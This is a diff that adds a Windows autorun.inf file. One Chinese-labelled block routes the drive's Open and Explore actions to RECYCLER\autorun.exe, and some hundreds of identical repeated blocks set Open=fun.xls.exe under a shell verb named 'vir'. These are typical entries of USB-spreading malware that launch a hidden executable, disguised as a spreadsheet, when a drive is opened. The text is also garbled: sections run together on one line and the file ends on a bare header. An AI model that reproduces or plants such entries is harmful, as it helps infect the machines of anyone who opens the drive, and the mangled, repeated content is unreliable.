@@ -1,0 +1,1876 @@
+[autorun]
+open=
+shell\open=打开(&O)
+shell\open\Command=RECYCLER\autorun.exe -OpenCurDir
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\Command=RECYCLER\autorun.exe -ExploreCurDir[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
+Open=fun.xls.exe
+shell=vir
+shell\vir=打开(&0)
+shell\vir\Command=fun.xls.exe /ShellApp
+[autorun]
